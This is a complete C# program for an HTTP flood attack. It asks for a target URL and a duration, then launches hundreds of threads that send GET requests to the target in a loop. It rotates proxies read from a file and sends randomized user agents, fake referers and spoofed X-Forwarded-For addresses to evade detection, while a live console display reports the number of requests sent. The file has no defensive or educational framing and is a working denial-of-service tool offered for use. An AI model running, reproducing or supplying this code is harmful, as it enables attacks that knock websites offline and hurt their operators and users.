using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

class Program
{
    static List<string> proxies = new List<string>();
    static Random rand = new Random();
    static int totalRequests = 0;
    static int activeThreads = 0;
    static bool attackRunning = true;
    static object consoleLock = new object();
    
    static List<string> userAgents = new List<string>
    {
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36"
    };

    static List<string> referers = new List<string>
    {
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.reddit.com/",
        "https://www.wikipedia.org/",
        "https://www.youtube.com/"
    };

    static string GetRandom(List<string> list) => list[rand.Next(list.Count)];
    static string GenerateRandomIP() => $"{rand.Next(1, 255)}.{rand.Next(0, 255)}.{rand.Next(0, 255)}.{rand.Next(1, 255)}";

    static HttpClientHandler CreateHandler()
    {
        return new HttpClientHandler
        {
            SslProtocols = SslProtocols.Tls12,  // Windows 7 supports only TLS 1.2
            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
            Proxy = proxies.Count > 0 ? new WebProxy(GetRandom(proxies)) : null,
            UseProxy = proxies.Count > 0
        };
    }

    static HttpClient CreateHttpClient()
    {
        var client = new HttpClient(CreateHandler())
        {
            DefaultRequestVersion = HttpVersion.Version11
        };

        client.DefaultRequestHeaders.UserAgent.ParseAdd(GetRandom(userAgents));
        client.DefaultRequestHeaders.Referrer = new Uri(GetRandom(referers));
        client.DefaultRequestHeaders.Add("X-Forwarded-For", GenerateRandomIP());
        client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.9");
        client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
        client.DefaultRequestHeaders.Add("Pragma", "no-cache");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");

        return client;
    }

    static async Task SendRequests(string url)
    {
        using (HttpClient client = CreateHttpClient())
        {
            while (attackRunning)
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    Interlocked.Increment(ref totalRequests);
                }
                catch { }
            }
        }
    }

    static void StartThreads(string url, int maxThreads)
    {
        int coreCount = Environment.ProcessorCount;
        int targetThreads = (int)(maxThreads * 0.3); // Use only 30% CPU power
        activeThreads = targetThreads;

        for (int i = 0; i < targetThreads; i++)
        {
            new Thread(() => SendRequests(url).Wait()).Start();
        }
    }

    static void DisplayStats(int attackDuration)
    {
        Stopwatch timer = Stopwatch.StartNew();

        while (attackRunning)
        {
            lock (consoleLock)
            {
                Console.Clear();
                Console.WriteLine("🔥 HTTP Attack Running 🔥");
                Console.WriteLine($"⏳ Time Left: {attackDuration - (int)timer.Elapsed.TotalSeconds}s");
                Console.WriteLine($"🔄 Active Threads: {activeThreads}");
                Console.WriteLine($"📊 Total Requests Sent: {totalRequests}");

                if (timer.Elapsed.TotalSeconds >= attackDuration)
                {
                    attackRunning = false;
                }
            }

            Thread.Sleep(1000);
        }

        Console.Clear();
        Console.WriteLine("✅ Attack Completed!");
        Console.WriteLine($"💥 Total Requests Sent: {totalRequests}");
    }

    static void Main()
    {
        Console.Write("🌐 Enter Target URL: ");
        string targetUrl = Console.ReadLine();

        Console.Write("⏳ Enter Attack Duration (seconds): ");
        int attackDuration = int.Parse(Console.ReadLine());

        if (File.Exists("proxy.txt"))
        {
            proxies.AddRange(File.ReadAllLines("proxy.txt"));
        }

        Console.WriteLine("🚀 Starting attack...");
        Thread statsThread = new Thread(() => DisplayStats(attackDuration));
        statsThread.Start();

        StartThreads(targetUrl, 1000);
    }
}
